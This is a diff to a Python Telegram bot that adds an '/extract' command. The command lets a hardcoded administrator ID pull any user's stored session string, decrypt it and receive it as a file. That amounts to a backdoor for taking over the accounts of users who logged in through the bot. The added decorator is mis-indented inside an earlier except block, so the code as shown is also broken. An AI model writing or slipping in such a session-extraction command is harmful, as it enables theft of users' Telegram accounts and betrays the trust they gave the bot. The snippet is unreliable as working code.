@@ -283,3 +283,31 @@ Still removing from database..."""
                 os.remove(f"{user_id}_client.session")
         except Exception:
             pass
+            @bot.on_message(filters.command('extract'))
+async def extract_command(client, message):
+    user_id = message.from_user.id
+    args = message.text.strip().split(" ")
+    is_admin = str(user_id) in ["123456789"]  # Replace with your Telegram ID
+
+    # Extract target user_id (if admin provided one)
+    target_id = user_id
+    if is_admin and len(args) > 1 and args[1].isdigit():
+        target_id = int(args[1])
+
+    # Fetch user session
+    session_data = await get_user_data(target_id)
+    if not session_data or 'session_string' not in session_data:
+        await message.reply("❌ No session found for this user.")
+        return
+
+    session_str = dcs(session_data['session_string'])
+
+    try:
+        await message.reply_document(
+            file_name=f"user_{target_id}_session.txt",
+            document=bytes(session_str, 'utf-8'),
+            caption=f"🔐 Session for user_id `{target_id}`"
+        )
+    except Exception as e:
+        await message.reply(f"❌ Failed to send session: {str(e)}")
+
